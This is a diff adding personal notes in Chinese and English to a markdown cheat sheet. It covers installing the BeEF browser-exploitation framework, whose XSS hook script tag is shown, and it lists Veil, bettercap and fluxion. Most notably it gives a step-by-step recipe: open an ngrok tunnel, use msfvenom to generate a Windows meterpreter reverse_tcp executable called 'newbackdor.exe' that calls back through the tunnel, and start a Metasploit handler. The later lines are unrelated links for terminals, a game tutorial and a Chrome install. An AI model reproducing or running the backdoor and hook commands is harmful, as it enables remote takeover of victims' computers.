@@ -957,9 +957,90 @@ $ gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/
 $ bundle config mirror.https://rubygems.org https://gems.ruby-china.com
 
 
+Beef 是一个和 metasploit一样的攻击框架
+
+```bash
+apt install beef-xss
+beef-xss
+[*]  Web UI: http://127.0.0.1:3000/ui/panel
+[*]    Hook: <script src="http://<IP>:3000/hook.js"></script>
+[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>
+
+● beef-xss.service - beef-xss
+     Loaded: loaded (/lib/systemd/system/beef-xss.service; disabled; vendor preset: disabled)
+     Active: active (running) since Mon 2021-03-29 01:10:48 CST; 5s ago
+   Main PID: 4682 (ruby)
+      Tasks: 3 (limit: 9466)
+     Memory: 69.6M
+        CPU: 2.487s
+     CGroup: /system.slice/beef-xss.service
+             └─4682 ruby /usr/share/beef-xss/beef
+
+Mar 29 01:10:48 kali systemd[1]: Started beef-xss.
+
+[*] Opening Web UI (http://127.0.0.1:3000/ui/panel) in: 5... 4... 3... 2... 1... 
+```
+
+#### docker 
+https://github.com/phocean/dockerfile-beef
+https://hub.docker.com/r/phocean/beef
 
 Setting up a Kali Linux Docker Image
 https://www.kali.org/blog/official-kali-linux-docker-images/
 muts@macbook-air:~$ docker pull kalilinux/kali-rolling
 muts@macbook-air:~$ docker run -t -i kalilinux/kali-rolling /bin/bash
 root@0129d62d2319:/# apt-get update && apt-get install metasploit-framework
+
+beef +　bettercap
+beef + veil
+
+veil
+set LHOST public_ip
+msfconsole set LHOST localip
+ipforwarding
+google: unnel alternative
+ngrok
+https://github.com/anderspitman/awesome-tunneling
+serveo 这个好像已经没有了
+内网穿透神器-Serveo
+https://www.jianshu.com/p/d0b3991a9ce1
+https://ngrok.com/
+https://serveo.net/
+https://localtunnel.github.io/www/
+http://localhost.run/
+
+外网攻击 
+ngrok tcp 4242
+0.tcp.ngrok.io:11620 -> localhost:4242
+msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io lport=11620 -f exe -o /root/newbackdor.exe
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4242
+exploit -j -z
+
+fluxion
+https://www.asciitohex.com
+https://conemu.github.io/
+https://cmder.net/
+https://github.com/cmderdev/cmder
+
+https://github.com/felixse/FluentTerminal/releases
+https://chocolatey.org/
+
+https://dev.to/adnanmostafa/the-best-free-standalone-terminals-for-windows-2019-kmj
+
+
+## free game website github source code
+
+Please find the links below which you will be using in the following lectures:
+
+Digital Ocean Signup with Credit Link: https://m.do.co/c/5ecb7c546723
+
+GitHub Game Link: https://github.com/atilsamancioglu/2048
+
+## chrome
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+sudo apt install ./google-chrome-stable_current_amd64.deb
